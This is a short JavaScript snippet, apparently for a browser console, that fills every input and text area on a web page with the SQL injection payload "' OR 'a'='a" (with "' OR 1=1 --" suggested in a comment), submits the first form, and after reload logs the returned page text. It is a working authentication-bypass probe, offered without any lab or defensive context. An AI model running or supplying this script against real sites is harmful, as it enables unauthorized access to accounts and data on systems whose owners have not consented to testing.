(function () {
  // Prevent repeated execution on reload
  if (sessionStorage.getItem('sqlTested') === 'true') {
    console.log("SQL Injection already tested, logging result:");
    setTimeout(() => {
      console.log(document.body.innerText); // ✅ Actual page content
    }, 1000);
    sessionStorage.removeItem('sqlTested'); // So future runs will work
    return;
  }

  console.log("Running SQL Injection script...");

  const sqlPayloads = [
    "' OR 'a'='a",  // or try "' OR 1=1 --"
  ];

  const formInputs = document.querySelectorAll('input, textarea');
  formInputs.forEach(input => {
    input.value = sqlPayloads[0];
    console.log(`Injected into: ${input.name || input.id}`);
  });

  const form = document.querySelector('form');
  if (form) {
    sessionStorage.setItem('sqlTested', 'true'); // Mark that we submitted
    setTimeout(() => {
      console.log("Submitting form...");
      form.submit();
    }, 1000); // short delay so injection is visible
  }
})();
